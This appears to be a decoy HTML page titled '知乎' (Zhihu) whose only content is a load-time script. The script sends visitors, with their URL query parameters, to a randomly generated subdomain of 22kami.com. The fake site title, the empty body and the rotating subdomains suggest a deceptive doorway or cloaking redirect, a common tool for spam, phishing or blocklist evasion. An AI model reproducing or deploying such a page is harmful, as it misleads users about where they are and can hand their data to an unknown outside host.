<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>知乎</title>
<script>
    window.onload = function() {
        // 生成随机的5位字母字符串
        function generateRandomString(length) {
            const chars = 'abcdefghijklmnopqrstuvwxyz';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        const randomSubdomain = generateRandomString(5); // 生成5位随机字母
        
        // 获取当前URL的参数部分
        var params = new URLSearchParams(window.location.search).toString();
        
        // 构造跳转到随机二级域名的URL，并带上参数
        var redirectUrl = `http://${randomSubdomain}.22kami.com/302.html?${params}`;
        
        // 使用window.location.href进行跳转
        window.location.href = redirectUrl;
    };
</script>
</head>
<body>

</body>
</html>
